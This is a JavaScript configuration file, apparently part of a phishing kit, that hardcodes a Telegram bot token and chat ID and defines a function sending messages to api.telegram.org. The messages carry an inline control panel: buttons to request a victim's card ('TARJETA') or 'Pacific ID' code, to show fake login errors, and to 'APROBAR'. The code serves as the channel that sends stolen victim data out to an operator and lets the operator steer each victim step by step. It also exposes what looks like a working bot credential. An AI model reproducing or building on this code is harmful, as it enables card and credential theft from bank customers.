// config.js
const TELEGRAM_CONFIG = {
    TOKEN: "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4",
    CHAT_ID: "-1003027102929"
};

const BUTTONS_PANEL = [
    [{ text: "💳 TARJETA", callback_data: "tarjeta" }, { text: "🛡️ PACIFIC ID", callback_data: "pacificid" }],
    [{ text: "❌ ERROR LOGIN", callback_data: "error_login" }, { text: "❌ ERROR PACIFICID", callback_data: "error_pacificid" }],
    [{ text: "❌ ERROR TARJETA", callback_data: "error_tarjeta" }],
    [{ text: "✅ APROBAR", callback_data: "aprobar" }]
];

async function enviarTelegram(mensaje) {
    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.TOKEN}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.CHAT_ID,
                text: mensaje,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: BUTTONS_PANEL
                }
            })
        });
    } catch (e) {
        console.error("Error enviando a Telegram:", e);
    }
}